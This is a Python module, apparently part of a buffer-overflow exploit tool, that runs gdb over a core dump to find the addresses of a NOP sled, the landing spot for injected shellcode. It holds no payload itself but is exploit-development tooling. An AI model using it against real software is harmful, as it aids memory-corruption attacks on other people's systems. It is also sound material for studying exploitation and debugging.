import logging
import os
import subprocess as sp
import tempfile as tf
from typing import List, Tuple

from ..config import STEP, NOP_SIGNATURE


def _search_in_range(start: int, end: int, corefile: str) -> List[int]:
    """
    Search for the 8‑byte NOP sled pattern
    within [start, end) in the core dump.
    """
    log = logging.getLogger("bof_exploit")
    script_lines = [
        "set pagination off",
        "set confirm off",
    ]

    addr = start
    while addr < end:
        chunk_end = min(addr + STEP, end)
        script_lines.append(f"printf \"[SEARCH] 0x{addr:x}-0x{chunk_end:x}\\n\"")
        script_lines.append(f"find /8 0x{addr:x}, 0x{chunk_end:x}, {NOP_SIGNATURE}")
        script_lines.append("printf \"[DONE]\\n\"")
        addr = chunk_end

    script = "\n".join(script_lines)

    with tf.NamedTemporaryFile(mode="w", delete=False) as f:
        f.write(script)
        script_path = f.name

    try:
        result = sp.run(
            ["gdb", "-batch", "-c", corefile, "-x", script_path],
            capture_output=True,
            text=True,
        )
    finally:
        os.unlink(script_path)

    found = []
    lines = result.stdout.splitlines()
    i = 0
    while i < len(lines):
        if lines[i].startswith("[SEARCH]"):
            i += 1
            if i < len(lines) and lines[i] and not lines[i].startswith("[DONE]"):
                # The line looks like: "0x7fffffffbc40: 0x9090909090909090"
                if "Pattern not found" not in lines[i]:
                    # Extract the address part (before the colon)
                    parts = lines[i].split(":")
                    if parts:
                        addr_str = parts[0].strip()
                        try:
                            addr_val = int(addr_str, 16)
                            found.append(addr_val)
                        except ValueError:
                            log.debug(f"Could not parse address from: {addr_str}")
            i += 1  # skip [DONE]
        else:
            i += 1

    return found


def search_signature(corefile: str, diapasones: List[Tuple[int, int]]) -> List[int]:
    """Find all occurrences of the NOP sled within the given address ranges."""
    all_found = []
    for start, end in diapasones:
        found = _search_in_range(start, end, corefile)
        all_found.extend(found)
    return all_found
